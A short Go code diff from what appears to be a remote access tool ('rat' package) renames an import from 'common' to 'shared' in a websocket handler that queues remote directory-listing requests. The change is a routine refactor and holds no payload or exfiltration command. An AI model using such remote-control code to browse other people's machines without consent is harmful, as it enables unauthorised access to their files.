@@ -2,7 +2,7 @@ package main
 
 import (
 	"encoding/json"
-	"rat/common"
+	"rat/shared"
 
 	"golang.org/x/net/websocket"
 )
@@ -20,7 +20,7 @@ func (d DirectoryRequestMessage) Handle(ws *websocket.Conn, client *Client, data
 		return err
 	}
 
-	client.Listeners[common.DirectoryHeader] = ws
+	client.Listeners[shared.DirectoryHeader] = ws
 	client.Queue <- &DirectoryPacket{Path: directoryEvent.Path}
 
 	return nil
